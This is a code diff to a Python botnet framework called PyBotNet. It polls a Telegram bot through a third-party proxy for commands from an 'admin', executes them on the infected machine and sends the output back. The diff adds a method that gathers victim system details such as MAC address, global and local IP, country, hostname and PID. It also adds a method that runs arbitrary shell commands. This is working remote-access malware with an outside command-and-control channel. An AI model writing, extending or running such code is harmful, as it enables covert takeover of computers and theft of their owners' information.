@@ -1,6 +1,8 @@
 # import built-in & third-party modules
 import logging
 
+from bs4.element import Comment
+
 # import pybotnet modules
 import util
 import scripts
@@ -41,7 +43,7 @@ class PyBotNet:
         return settings.pybotnet_info
 
     def pybotnet_up_time(self) -> int:
-        return util.get_current_epoc_time() - self.start_time
+        return int(util.get_current_epoc_time() - self.start_time)
 
     def send_message_by_third_party_proxy(self, message):
         '''Send messages by api url and third party proxy to adimn'''
@@ -63,7 +65,7 @@ class PyBotNet:
         return util.post_data(self.api_url, self.logger)
 
     def get_last_command_by_third_party_proxy(self):
-        '''return last message from admin or False'''
+        '''return last admin message or False'''
 
         messages_list = (util.get_update_by_third_party_proxy(
             self.TELEGRAM_TOKEN, self.logger))
@@ -79,7 +81,11 @@ class PyBotNet:
         return False
 
     def get_and_execute_scripts_by_third_party_proxy(self):
-
+        '''
+        Automatically takes the command from the telegram
+         and checks whether the command is in the list of commands or not \n
+        Then run it
+        '''
         self.command = self.get_last_command_by_third_party_proxy()
         if self.command:
 
@@ -94,3 +100,17 @@ class PyBotNet:
                 if self.output:
                     self.send_message_by_third_party_proxy(
                         f'output: \n{self.output}')
+
+    def get_system_info(self) -> str:
+        '''
+        return system info: \n
+        operating system ,mac addres ,global ip, \n
+        country ,pybotnet up time ,local ip,\n
+        Hostname ,current route ,pid, \n
+        ...more
+        '''
+        return scripts.get_info(self.pybotnet_up_time(), self.logger)
+
+    def run_command_in_system(self, command: str) -> str:
+        '''run system command in console and return data'''
+        return scripts.execute_cmd('None '+command, self.logger)
